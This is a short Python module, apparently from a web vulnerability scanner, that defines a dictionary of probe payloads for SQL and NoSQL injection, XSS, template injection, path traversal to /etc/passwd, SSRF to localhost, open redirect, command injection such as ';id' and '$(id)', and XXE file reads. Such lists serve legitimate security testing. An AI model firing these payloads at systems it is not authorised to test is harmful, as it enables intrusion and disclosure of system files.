from __future__ import annotations

PAYLOADS = {
    "SQL Injection": ["'", '"', "' OR '1'='1", "' AND '1'='2", "1 ORDER BY 1-- -", "1 UNION SELECT NULL-- -"],
    "XSS": ["<xss-test>", "<script>alert(1)</script>", "\"><xss-test>", "' onmouseover=alert(1) x='"],
    "SSTI": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
    "LFI / Traversal": ["../", "../../etc/passwd", "..%2f..%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd"],
    "SSRF": ["http://127.0.0.1/", "http://localhost/", "http://[::1]/"],
    "NoSQL Injection": ['{"$ne":null}', '{"$gt":""}', "' || '1'=='1"],
    "Open Redirect": ["https://example.com/", "//example.com/", "\\\\example.com\\"],
    "Command Injection": [";id", "&&id", "|id", "$(id)"],
    "XXE": ["<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/hostname'>]>", "<!DOCTYPE x [<!ENTITY e SYSTEM 'http://127.0.0.1/'>]>"] ,
}
